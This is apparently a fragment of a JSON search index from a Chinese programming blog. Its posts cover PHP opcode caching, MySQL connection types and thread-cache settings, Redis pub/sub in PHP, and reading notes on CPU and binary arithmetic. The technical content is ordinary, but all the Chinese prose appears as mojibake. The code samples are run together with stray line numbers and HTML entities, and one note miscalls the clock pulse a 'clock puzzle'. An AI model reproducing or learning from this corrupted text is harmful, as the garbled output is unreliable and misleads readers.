çš„è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç¼–è¯‘ï¼ˆcompileï¼‰ã€‚ ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨çš„ä¸€ä¸ªæœ¬è´¨åŒºåˆ«åœ¨äºï¼Œè§£é‡Šå™¨ç”Ÿæˆä¸­é—´ä»£ç åï¼Œä¾¿ç›´æ¥æ‰§è¡Œå®ƒï¼Œæ‰€ä»¥è¿è¡Œæ—¶çš„æ§åˆ¶æƒåœ¨è§£é‡Šå™¨; è€Œç¼–è¯‘å™¨åˆ™å°†ä¸­é—´ä»£ç è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œç”Ÿæˆå¯ä»¥ç›´æ¥è¿è¡Œçš„ç›®æ ‡ç¨‹åºï¼Œä½†ä¸æ‰§è¡Œå®ƒï¼Œç”¨æˆ·å¯ä»¥åœ¨éšåçš„ä»»æ„æ—¶é—´æ‰§è¡Œå®ƒï¼Œè¿™æ—¶æ§åˆ¶æƒåœ¨ç›®æ ‡ç¨‹åºï¼Œå’Œç¼–è¯‘å™¨æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ äº‹å®ä¸Šï¼Œå°±è§£é‡Šå’Œç¼–è¯‘æœ¬èº«è€Œè¨€ï¼Œå®ƒä»¬çš„åŸç†æ˜¯ç›¸ä¼¼çš„ï¼Œéƒ½åŒ…æ‹¬è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æç­‰ã€‚ ä¸ºä»€ä¹ˆå¼€å¯ opcodeï¼Œå¯¹æ€§èƒ½çš„æå‡ä¼šå·¨å¤§ï¼Ÿè¿™æ˜¯å› ä¸º PHP åœ¨åŠ¨æ€è§£æè¯­æ³•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”Ÿæˆæ“ä½œç ï¼Œè€Œæ‰“å¼€opcode ç¼“å­˜ï¼Œå°±å¯ä»¥é¿å…é‡å¤ç¼–è¯‘ã€‚ å½“ç„¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„åŠ¨æ€å†…å®¹éƒ½åœ¨åº”ç”¨äº† opcode cache ä¹‹åæœ‰å¤§å¹…åº¦çš„æ€§èƒ½æå‡ï¼Œå› ä¸º opcode cache çš„ç›®çš„æ˜¯å‡å°‘CPU å’Œå†…å­˜å¼€é”€ï¼Œå¦‚æœåŠ¨æ€å†…å®¹çš„æ€§èƒ½ç“¶é¢ˆä¸åœ¨äºCPU å’Œå†…å­˜ï¼Œè€Œåœ¨äºI/O æ“ä½œï¼Œæ¯”å¦‚æ•°æ®åº“æŸ¥è¯¢å¸¦æ¥çš„ç£ç›˜I/O å¼€é”€ï¼Œé‚£ä¹ˆopcode cache çš„æ€§èƒ½æå‡æ˜¯éå¸¸æœ‰é™çš„ã€‚ æœ‰æ„ä¹‰çš„é—®é¢˜Qï¼šå‡å¦‚100 ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨åˆ†åˆ«è¿›è¡Œ 10æ¬¡è¯·æ±‚ï¼Œä¸ 1 ä¸ªç”¨æˆ·å‘æœåŠ¡å™¨è¿ç»­è¿›è¡Œ 1000 æ¬¡è¯·æ±‚ï¼Œæ•ˆæœä¸€æ ·å—ï¼Ÿä¹Ÿå°±æ˜¯è¯´ç»™æœåŠ¡å™¨å¸¦æ¥çš„å‹åŠ›ä¸€æ ·å—ï¼ŸAï¼šè™½ç„¶çœ‹èµ·æ¥æœåŠ¡å™¨éƒ½éœ€è¦è¿ç»­å¤„ç† 1000 ä¸ªè¯·æ±‚ï¼Œå…¶å®å…³é”®çš„åŒºåˆ«å°±åœ¨äºï¼Œæ˜¯å¦çœŸçš„â€è¿ç»­â€œã€‚é¦–å…ˆæœ‰ä¸€ç‚¹éœ€è¦æ˜ç™½ï¼Œå¯¹äºå‹åŠ›æµ‹è¯•ä¸­æåˆ°çš„æ¯ä¸€ä¸ªç”¨æˆ·ï¼Œè¿ç»­å‘é€è¯·æ±‚å®é™…ä¸Šæ˜¯æŒ‡åœ¨å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æ¥å—åˆ°å“åº”æ•°æ®åå†å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œè¿™æ ·ä¸€æ¥ï¼Œä»å¾®è§‚å±‚é¢æ¥çœ‹ï¼Œ1 ä¸ªç”¨æˆ·å‘æœåŠ¡å™¨è¿ç»­è¿›è¡Œ 1000æ¬¡è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶åˆ»æœåŠ¡å™¨çš„ç½‘å¡æ¥æ”¶ç¼“å†²åŒºä¸­åªæœ‰æ¥è‡ªè¯¥ç”¨æˆ·çš„ 1 ä¸ªè¯·æ±‚ï¼Œè€Œ 100 ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨åˆ†åˆ«è¿›è¡Œ 10 æ¬¡è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨ç½‘å¡æ¥æ”¶ç¼“å†²åŒºæœ€å¤šæœ‰ 100 ä¸ªç­‰å¾…å¤„ç†çš„è¯·æ±‚ï¼Œæ˜¾ç„¶è¿™æ—¶æœåŠ¡å™¨çš„å‹åŠ›æ›´å¤§ã€‚ Qï¼šå…³äºworker è¿›ç¨‹çš„æ•°é‡ï¼Œæ—¢ç„¶å¯ä»¥ç”±æˆ‘ä»¬æ¥è®¾ç½®ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è¶Šå¤šè¶Šå¥½å‘¢ï¼ŸAï¼šæ˜¾ç„¶ä¸æ˜¯ï¼Œä»»ä½•æ—¶åˆ»ä»CPU çš„è§’åº¦æ¥çœ‹ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œã€‚æ²¡æœ‰ä¸€ä¸ªç»å¯¹çš„å…¬å¼æ¥å‘Šè¯‰ä½ å¦‚ä½•é€‰æ‹©worker è¿›ç¨‹æ•°ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µå…·ä½“åˆ†æå’Œè°ƒæ•´ã€‚ Qï¼š7ms æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼ŸAï¼šä¸€ä¸ªæ¯”ç‰¹é€šè¿‡å…‰çº¤ä»åŒ—äº¬ä¼ åˆ°è¥¿å®‰ï¼Œç†è®ºä¸Šåªéœ€è¦ 5ms; 25 æ¯«ç§’è¶³ä»¥è®©æ¯”ç‰¹ä¼ æ’­æ¥è¿‘åœ°çƒèµ¤é“åŠå¾„çš„è·ç¦»ã€‚ Qï¼šç¼“å­˜çš„ç›®çš„ï¼ŸAï¼šç¼“å­˜çš„ç›®çš„å°±æ˜¯æŠŠéœ€è¦èŠ±è´¹æ˜‚è´µå¼€é”€çš„è®¡ç®—ç»“æœä¿å­˜èµ·æ¥ï¼Œåœ¨ä»¥æ¥éœ€è¦çš„æ—¶å€™ç›´æ¥å–å‡ºï¼Œé¿å…é‡å¤è®¡ç®—ã€‚","categories":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP ä¸­å®ç° Mysql è¿æ¥æ± ä¸æŒä¹…åŒ–","slug":"mysql-connection-pool-and-persistence-in-php","date":"2021-02-03T11:42:17.000Z","updated":"2021-02-03T12:46:55.581Z","comments":true,"path":"mysql-connection-pool-and-persistence-in-php/","link":"","permalink":"https://www.0x2beace.com/mysql-connection-pool-and-persistence-in-php/","excerpt":"Mysql çš„è¿æ¥æ–¹å¼æœ‰ä¸¤ç§ï¼štcp å’Œ socketã€‚å‰è€…æ˜¯åŸºäºtcp/ipåè®®ï¼Œåè€…æ˜¯åŸºäºsocket å¥—æ¥å­—ã€‚","text":"Mysql çš„è¿æ¥æ–¹å¼æœ‰ä¸¤ç§ï¼štcp å’Œ socketã€‚å‰è€…æ˜¯åŸºäºtcp/ipåè®®ï¼Œåè€…æ˜¯åŸºäºsocket å¥—æ¥å­—ã€‚ å…·ä½“ï¼š tcp/ipï¼šmysql -h 127.0.0.1 -uroot -p socketï¼šmysql -h localhost -uroot -p æˆ–è€… mysql -uroot -p å¯ä»¥é€šè¿‡ tcpdumpå‘½ä»¤æŠ“åŒ…ã€‚ æŒ‡å®šæºç«¯å£ï¼š 1$ tcpdump -i lo0 port 3306 å¦‚æœå‡ºç°ä»¥ä¸‹å†…å®¹ï¼Œè¡¨ç¤ºæœ¬åœ°æ²¡æœ‰lo0è¿™ä¸ªè®¾å¤‡ã€‚ 12tcpdump: lo: No such device exists(BIOCSETIF failed: Device not configured) å¯ä»¥é€šè¿‡tcpdump -D å‘½ä»¤æŸ¥çœ‹æœ¬åœ°è®¾å¤‡åç§°ï¼š 121.en0 [Up, Running]2.lo0 [Up, Running, Loopback] ä½¿ç”¨mysql -h 127.0.0.1 -uroot -pï¼Œå¯ä»¥çœ‹åˆ°Mysql çš„è¿æ¥è¿‡ç¨‹æ˜¯åŸºäºtcp/ip åè®®ã€‚ å½“å®¢æˆ·ç«¯é€€å‡ºMysql æ—¶ï¼Œä¼šå‘é€å››æ¡è®°å½•ï¼Œä¹Ÿå°±æ˜¯tcp çš„å››æ¬¡æŒ¥æ‰‹ã€‚ socket æ–¹å¼ä¼šå¿«äºtcp/ipï¼Œ mysql ä½¿ç”¨çº¿ç¨‹æ¥å¤„ç†è¿æ¥ï¼Œæ¯å½“ä¸€ä¸ªè¯·æ±‚è¿›æ¥ï¼ŒMySQLä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»å¤„ç†è¯·æ±‚ï¼Œ å¯ä»¥ä½¿ç”¨show statuså‘½ä»¤æŸ¥çœ‹å½“å‰å¤„äºè¿æ¥çŠ¶æ€çš„çº¿ç¨‹ä¸ªæ•°ï¼Œæ‰€ä»¥åœ¨é«˜å¹¶å‘ä¸‹ï¼Œè¿™å°†ç»™MySQLæœåŠ¡å™¨å¸¦æ¥å·¨å¤§çš„å‹åŠ›ï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ Mysql çº¿ç¨‹æ± å®é™…ä¸Š mysql å®ç°äº†çº¿ç¨‹æ± ï¼Œå½“å®¢æˆ·ç«¯æ–­å¼€è¿æ¥åï¼Œmysql ä¼šå°†å½“å‰çº¿ç¨‹ç¼“å­˜èµ·æ¥ï¼Œå½“ä¸‹ä¸€æ¬¡æœ‰æ–°çš„è¯·æ±‚è¿›æ¥æ—¶ï¼Œæ— éœ€åˆ›å»ºæ–°çš„çº¿ç¨‹ã€‚ æŸ¥çœ‹çº¿ç¨‹æ± å¤§å°ï¼š 1mysql&gt; show variables like &#39;thread_cache_size&#39;; è®¾ç½®çº¿ç¨‹æ± å¤§å°ï¼š 1mysql&gt; set global thread_cache_size &#x3D; 20; æŸ¥çœ‹çº¿ç¨‹æ± çŠ¶æ€ï¼š 12345678910mysql&gt; show status like &#39;Threads_%&#39;;+-------------------+-------+| Variable_name | Value |+-------------------+-------+| Threads_cached | 8 || Threads_connected | 3 || Threads_created | 53 || Threads_running | 1 |+-------------------+-------+4 rows in set (0.02 sec) å…¶ä¸­ï¼š Threads_cachedï¼šç©ºé—²çº¿ç¨‹æ•°é‡ã€‚å½“æœ‰æ–°çš„è¯·æ±‚è¿›æ¥æ—¶ï¼Œmysql ä¸ä¼šç«‹å³åˆ›å»ºçº¿ç¨‹å»å¤„ç†ï¼Œè€Œæ˜¯å»Threads_cachedæŸ¥çœ‹ç©ºé—²çš„è¿æ¥çº¿ç¨‹ï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥ä½¿ç”¨ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°çš„çº¿ç¨‹ã€‚ Threads_connectedï¼šå½“å‰å¤„äºè¿æ¥çŠ¶æ€çš„çº¿ç¨‹ä¸ªæ•°ã€‚ Threads_createdï¼šåˆ›å»ºè¿‡çš„çº¿ç¨‹æ•°ï¼Œå¦‚æœå‘ç°Threads_createdå€¼è¿‡å¤§çš„è¯ï¼Œè¡¨æ˜ mysql æœåŠ¡å™¨ä¸€ç›´åœ¨åˆ›å»ºçº¿ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯æ¯”è¾ƒè€—èµ„æºï¼Œå¯ä»¥é€‚å½“å¢åŠ é…ç½®æ–‡ä»¶ä¸­Thread_cache_sizeå€¼ã€‚ Threads_runningï¼šå¤„äºæ¿€æ´»çŠ¶æ€çš„çº¿ç¨‹çš„ä¸ªæ•°ï¼Œè¿™ä¸ªä¸€èˆ¬éƒ½æ˜¯è¿œå°äºThreads_connectedçš„ã€‚ çº¿ç¨‹æ± çš„å‡ºç°è§£å†³äº†é¢‘ç¹çš„åˆ›å»ºè¿æ¥å’Œé”€æ¯è¿æ¥çš„é—®é¢˜ï¼Œä½†ä»…æœ‰çº¿ç¨‹æ± è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œä¸èƒ½è§£å†³å®¢æˆ·ç«¯é¢‘ç¹è¿æ¥mysql å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚ å‚è€ƒé“¾æ¥ PHPä¸­å®ç°MySQLè¿æ¥æ± ä¸æŒä¹…åŒ– ç”¨Swoole4 æ‰“é€ é«˜å¹¶å‘çš„PHPåç¨‹Mysqlè¿æ¥æ± ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP å®è·µ Redis å‘å¸ƒè®¢é˜…","slug":"php-practice-redis-publish-and-subscribe","date":"2021-01-22T14:57:36.000Z","updated":"2021-01-22T14:58:49.610Z","comments":true,"path":"php-practice-redis-publish-and-subscribe/","link":"","permalink":"https://www.0x2beace.com/php-practice-redis-publish-and-subscribe/","excerpt":"Redis é›†æˆäº†Pub/SubåŠŸèƒ½ï¼ˆmeans Publish, Subscribeï¼‰å³å‘å¸ƒåŠè®¢é˜…åŠŸèƒ½ã€‚","text":"Redis é›†æˆäº†Pub/SubåŠŸèƒ½ï¼ˆmeans Publish, Subscribeï¼‰å³å‘å¸ƒåŠè®¢é˜…åŠŸèƒ½ã€‚ Redis æœ‰å„ç§è¯­è¨€çš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œä»…ä»¥PHP çš„å®¢æˆ·ç«¯æ¥äº†è§£Redis çš„å‘å¸ƒè®¢é˜…ã€‚ å‘å¸ƒè€…ï¼šå³publishå®¢æˆ·ç«¯ï¼Œæ— éœ€ç‹¬å é“¾æ¥ï¼Œä½ å¯ä»¥åœ¨publishæ¶ˆæ¯çš„åŒæ—¶ï¼Œä½¿ç”¨åŒä¸€ä¸ªredis-clienté“¾æ¥è¿›è¡Œå…¶ä»–æ“ä½œï¼ˆä¾‹å¦‚ï¼šINCRç­‰ï¼‰ è®¢é˜…è€…ï¼šå³subscribeå®¢æˆ·ç«¯ï¼Œéœ€è¦ç‹¬å é“¾æ¥ï¼Œå³è¿›è¡ŒsubscribeæœŸé—´ï¼Œredis-clientæ— æ³•ç©¿æ’å…¶ä»–æ“ä½œï¼Œæ­¤æ—¶clientä»¥é˜»å¡çš„æ–¹å¼ç­‰å¾…â€œpublishç«¯â€çš„æ¶ˆæ¯ï¼›è¿™ä¸€ç‚¹å¾ˆå¥½ç†è§£ï¼Œå› æ­¤subscribeç«¯éœ€è¦ä½¿ç”¨å•ç‹¬çš„é“¾æ¥ï¼Œç”šè‡³éœ€è¦åœ¨é¢å¤–çš„çº¿ç¨‹ä¸­ä½¿ç”¨ã€‚ ç»ˆç«¯å®ç°è®¢é˜…è€…è®¢é˜…é¢‘é“ï¼š å‘å¸ƒè€…å‘é¢‘é“ä¸­å‘é€å†…å®¹ ä»£ç å®ç°subscribe å®¢æˆ·ç«¯ï¼š 12345678910111213141516171819202122&lt;?php$redis &#x3D; getConnect();$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); $redis-&gt;subscribe([&quot;channel1&quot;], function ($instance, $chan, $msg) &#123; echo $msg; &#x2F;** * $instance æ˜¯ä¸Šé¢åˆ›å»ºçš„Redis å®ä¾‹å¯¹è±¡ï¼Œå› ä¸ºç‹¬å é“¾æ¥çš„å…³ç³»ï¼Œè¯¥å®ä¾‹ä¸èƒ½æ‰§è¡Œå…¶ä»–æ“ä½œã€‚ * å¦‚æœè¦ä½¿ç”¨Redisï¼Œéœ€æ–°å»ºä¸€ä¸ªè¿æ¥ *&#x2F; $redis &#x3D; getConnect(); $redis-&gt;get(&quot;name&quot;); &#x2F;&#x2F; todo ä¸šåŠ¡é€»è¾‘&#125;);function getConnect()&#123; $redis &#x3D; new Redis(); $redis-&gt;connect(&quot;127.0.0.1&quot;, 6379); $redis-&gt;auth(&quot;&quot;); return $redis;&#125; publish å®¢æˆ·ç«¯ï¼š 12345&lt;?php$redis &#x3D; new Redis();$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);$redis-&gt;publish(&#39;channel1&#39;, &#39;hello, redis&#39;); æ³¨æ„subscribe å®¢æˆ·ç«¯éœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸è¶…æ—¶ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ini_set(&#39;default_socket_timeout&#39;, -1) $redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1) å¦‚æœä¸è®¾ç½®ä¸è¶…æ—¶ï¼Œ60såä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼š 1Fatal error: Uncaught RedisException: read error on connection to 127.0.0.1:6379 æ–¹å¼ä¸€æ˜¯é€šè¿‡ä¸´æ—¶ä¿®æ”¹ php.ini é…ç½®é¡¹ï¼Œdefault_socket_timeouté»˜è®¤ä¸º 60s ã€‚ default_socket_timeout æ˜¯socketæµçš„è¶…æ—¶å‚æ•°ï¼Œå³socketæµä»å»ºç«‹åˆ°ä¼ è¾“å†åˆ°å…³é—­æ•´ä¸ªè¿‡ç¨‹å¿…é¡»è¦åœ¨è¿™ä¸ªå‚æ•°è®¾ç½®çš„æ—¶é—´ä»¥å†…å®Œæˆï¼Œå¦‚æœä¸èƒ½å®Œæˆï¼Œé‚£ä¹ˆPHPå°†è‡ªåŠ¨ç»“æŸè¿™ä¸ªsocketå¹¶è¿”å›ä¸€ä¸ªè­¦å‘Šã€‚ æ¨èç¬¬äºŒç§ï¼Œå› ä¸ºæ–¹å¼äºŒæ˜¯é€šè¿‡ä¿®æ”¹redisçš„é…ç½®é¡¹ï¼Œå› æ­¤ä»…å¯¹redisè¿æ¥ç”Ÿæ•ˆï¼Œç›¸å¯¹äºæ–¹å¼ä¸€ï¼Œä¸ä¼šäº§ç”Ÿæ„å¤–çš„å¯¹å…¶ä»–éƒ¨åˆ†çš„å½±å“ã€‚ å‚è€ƒé“¾æ¥ phpå®ç°redisæ¶ˆæ¯å‘å¸ƒè®¢é˜…","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®°","slug":"How-does-the-program-run-reading-notes","date":"2021-01-21T14:01:32.000Z","updated":"2021-02-03T12:47:57.415Z","comments":true,"path":"How-does-the-program-run-reading-notes/","link":"","permalink":"https://www.0x2beace.com/How-does-the-program-run-reading-notes/","excerpt":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®°","text":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®° CPUCPUï¼ˆè®¡ç®—æœºï¼‰èƒ½å¤Ÿç›´æ¥è¯†åˆ«å’Œæ‰§è¡Œçš„åªæœ‰æœºå™¨è¯­è¨€ã€‚ä½¿ç”¨ Cã€Java ç­‰è¯­ è¨€ç¼–å†™çš„ç¨‹åºï¼Œæœ€åéƒ½ä¼šè½¬åŒ–æˆæœºå™¨è¯­è¨€ã€‚ CPU å’Œå†…å­˜æ˜¯ç”±è®¸å¤šæ™¶ä½“ç®¡ç»„æˆçš„ç”µå­éƒ¨ä»¶ï¼Œé€šå¸¸ç§°ä¸º IC (Integrated Circuitï¼Œé›†æˆç”µè·¯)ã€‚ CPU çš„å†…éƒ¨ç”±å¯„å­˜å™¨ã€æ§åˆ¶å™¨ã€è¿ç®—å™¨å’Œæ—¶é’Ÿå››ä¸ªéƒ¨åˆ†æ„æˆï¼Œå„éƒ¨åˆ†ä¹‹é—´ ç”±ç”µæµä¿¡å·ç›¸äº’è¿é€šã€‚ å¯„å­˜å™¨ï¼š å¯„å­˜å™¨\u0003å¯ç”¨æ¥æš‚å­˜æŒ‡ä»¤ã€æ•°æ®ç­‰å¤„ç†å¯¹è±¡ï¼Œå¯ä»¥å°†å…¶çœ‹ä½œæ˜¯å†…å­˜çš„ä¸€ç§ã€‚æ ¹æ®ç§ç±»çš„ä¸åŒï¼Œä¸€ä¸ª CPU å†…éƒ¨ä¼šæœ‰20~100 ä¸ªå¯„å­˜å™¨ã€‚ æ§åˆ¶å™¨ï¼šæ§åˆ¶å™¨\u0003è´Ÿè´£æŠŠå†…å­˜ä¸Šçš„æŒ‡ä»¤ã€æ•°æ®ç­‰è¯»å…¥å¯„å­˜å™¨ï¼Œå¹¶æ ¹æ®æŒ‡ä»¤çš„æ‰§è¡Œç»“æœæ¥æ§åˆ¶æ•´ä¸ªè®¡ç®—æœºã€‚ è¿ç®—å™¨ï¼šè¿ç®—å™¨\u0003è´Ÿè´£è¿ç®—ä»å†…å­˜è¯»å…¥å¯„å­˜å™¨çš„æ•°æ®ã€‚ æ—¶é’Ÿï¼šæ—¶é’Ÿ\u0003è´Ÿè´£å‘å‡º CPU å¼€å§‹è®¡æ—¶çš„æ—¶é’Ÿä¿¡å·ã€‚ æ—¶é’Ÿä¿¡å·è‹±æ–‡å«ä½œ clock puzzleã€‚Pentium 2 GHz è¡¨ç¤ºæ—¶é’Ÿä¿¡å·çš„é¢‘ç‡ä¸º 2 GHz(1 GHz = 10 äº¿æ¬¡ / ç§’)ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ—¶é’Ÿä¿¡å·çš„é¢‘ç‡è¶Šé«˜ï¼ŒCPU çš„ è¿è¡Œé€Ÿåº¦è¶Šå¿«ã€‚ é€šå¸¸æˆ‘ ä»¬å°†æ±‡ç¼–è¯­è¨€ç¼–å†™çš„ç¨‹åºè½¬åŒ–æˆæœºå™¨è¯­è¨€çš„è¿‡ç¨‹ç§°ä¸º æ±‡ç¼–;åä¹‹ï¼Œæœºå™¨è¯­è¨€ç¨‹åºè½¬åŒ–æˆæ±‡ç¼–è¯­è¨€ç¨‹åºçš„è¿‡ç¨‹åˆ™ç§°ä¸º åæ±‡ç¼–ã€‚ é«˜çº§è¯­è¨€ç¼–å†™çš„ç¨‹åº =ã€‹ç»è¿‡ç¼–è¯‘è½¬æ¢ä¸ºæœºå™¨è¯­è¨€=ã€‹CPUå†…éƒ¨çš„å¯„å­˜å™¨æ¥è¿›è¡Œå¤„ç†ã€‚ ç¼–è¯‘æŒ‡çš„æ˜¯ä½¿ç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ç¨‹åºè½¬æ¢ä¸ºæœºå™¨è¯­è¨€çš„è¿‡ç¨‹ï¼Œå…¶ä¸­ï¼Œç”¨äºè½¬æ¢çš„ç¨‹åºè¢«ç§°ä¸ºç¼–è¯‘å™¨ã€‚ å¯¹äºç¨‹åºå‘˜æ¥è¯´ï¼ŒCPU æ˜¯ä»€ä¹ˆå‘¢ï¼ŸCPU æ˜¯å…·æœ‰å„ç§åŠŸèƒ½çš„å¯„å­˜å™¨çš„é›†åˆä½“ï¼Œæ‰€ä»¥å¯ä»¥å°†å¯„å­˜å™¨ç†è§£æˆæ˜¯CPU çš„æ ¸å¿ƒï¼Œä¸»è¦æ‰¿æ‹…ç€æŒ‡ä»¤ã€æ•°æ®çš„å¤„ç†ã€‚ äºŒè¿›åˆ¶è½¬åè¿›åˆ¶çš„æ–¹å¼ï¼šå³å„ä½æ•°çš„æ•°å€¼å’Œä½æƒç›¸ä¹˜åå†ç›¸åŠ çš„æ•°å€¼ã€‚ ä½æƒçš„æ¦‚å¿µï¼š39 = 3 * 10 + 9 * 1 å…¶ä¸­ 10 å’Œ 1 å°±æ˜¯ä½æƒã€‚åœ¨åè¿›åˆ¶ä¸­ï¼Œç¬¬ 1 ä½(æœ€å³è¾¹çš„ä¸€ä½) æ˜¯ 10 çš„ 0 æ¬¡å¹‚ A(= 1)ï¼Œç¬¬ 2 ä½æ˜¯ 10 çš„ 1 æ¬¡å¹‚(= 10)ï¼Œç¬¬ 3 ä½æ˜¯ 10 çš„ 2 æ¬¡å¹‚(= 100)ã€‚ åœ¨äºŒè¿›åˆ¶ä¸­ï¼Œç¬¬ 1 ä½æ˜¯ 2 çš„ 0 æ¬¡å¹‚ (= 1)ï¼Œç¬¬2ä½æ˜¯2çš„1æ¬¡å¹‚(= 2)ï¼Œè¿™å°±æ˜¯ä½æƒã€‚ æ— è®ºç¨‹åºä¸­ä½¿ç”¨çš„æ˜¯å¤šå°‘è¿›åˆ¶ï¼Œè®¡ç®—æœºæœ€ç»ˆéƒ½ä¼šè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ¥å¤„ç†ã€‚ äºŒè¿›åˆ¶äºŒè¿›åˆ¶çš„è¿ç®—æ–¹å¼æ˜¯ï¼šå¯¹äºåè¿›åˆ¶ï¼Œè¿›è¡ŒåŠ æ³•è¿ç®—æ—¶é€¢åè¿›ä¸€ï¼Œè¿›è¡Œå‡æ³•è¿ç®—æ—¶å€Ÿä¸€å½“åï¼›å¯¹äºäºŒè¿›åˆ¶ï¼Œè¿›è¡ŒåŠ æ³•è¿ç®—æ—¶é€¢äºŒè¿›ä¸€ï¼Œè¿›è¡Œå‡æ³•è¿ç®—æ—¶å€Ÿä¸€å½“äºŒã€‚ äºŒè¿›åˆ¶æ•°ä¸­è¡¨ç¤ºè´Ÿæ•°å€¼æ—¶ï¼Œä¸€èˆ¬ä¼šæŠŠæœ€é«˜ä½ä½œä¸ºç¬¦å·æ¥ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬æŠŠè¿™ä¸ªæœ€é«˜ä½ç§°ä¸ºç¬¦å·ä½ã€‚ ç¬¦å·ä½æ˜¯ 0 æ—¶è¡¨ç¤ºæ­£æ•° ï¼Œç¬¦å·ä½æ˜¯ 1 æ—¶è¡¨ç¤ºè´Ÿæ•°ã€‚ å°†äºŒè¿›åˆ¶æ•°çš„å€¼å–åååŠ  1 çš„ç»“æœï¼Œå’ŒåŸæ¥çš„å€¼ç›¸åŠ ï¼Œç»“æœä¸º0 ã€‚å®é™…ä¸Šå°±æ˜¯1 + (-1) = 0 è®¡ç®—æœºè¿›è¡Œå°æ•°è¿ç®— ä¸ºä»€ä¹ˆå°†0.1 ç´¯åŠ ä¸€ç™¾æ¬¡æ— æ³•å¾—åˆ° 10ï¼Ÿ è¿™æ˜¯å› ä¸ºè®¡ç®—æœºæ— æ³•å‡†ç¡®ç”¨äºŒè¿›åˆ¶è¡¨ç¤º 0.1ï¼Œ åè¿›åˆ¶çš„0.1 è½¬æ¢æˆäºŒè¿›åˆ¶åï¼Œä¼šå˜æˆ0.00011001100...(1100 å¾ªç¯)è¿™æ ·çš„ å¾ªç¯å°æ•°ï¼Œè¿™å’Œæ— æ³•ç”¨åè¿›åˆ¶å‡†ç¡®è¡¨ç¤º 1/3 ä¸€æ ·çš„é“ç†ã€‚ å› æ­¤ï¼Œåœ¨ é‡åˆ°å¾ªç¯å°æ•°æ—¶ï¼Œè®¡ç®—æœºå°±ä¼šæ ¹æ®å˜é‡æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„é•¿åº¦å°†æ•°å€¼ ä»ä¸­é—´æˆªæ–­æˆ–è€…å››èˆäº”å…¥ã€‚ å° æ•° ç‚¹ å 4 ä½ ç”¨ äºŒ è¿› åˆ¶ æ•° è¡¨ ç¤º æ—¶ çš„ æ•° å€¼ èŒƒ å›´ ä¸º 0.0000~0.1111ã€‚å› æ­¤ï¼Œè¿™é‡Œåªèƒ½è¡¨ç¤º 0.5ã€0.25ã€0.125ã€0.0625 è¿™å››ä¸ª äºŒè¿›åˆ¶æ•°å°æ•°ç‚¹åé¢çš„ä½æƒç»„åˆè€Œæˆ(ç›¸åŠ æ€»å’Œ)çš„å°æ•°ã€‚ æ‰€ä»¥0.5 ç´¯åŠ ä¸€ç™¾æ¬¡å¯ä»¥åˆ°çš„ 50ï¼Œè€Œ0.1 ç´¯åŠ ä¸€ç™¾æ¬¡åˆ™ä¼šä¸¢å¤±ç²¾åº¦ã€‚ 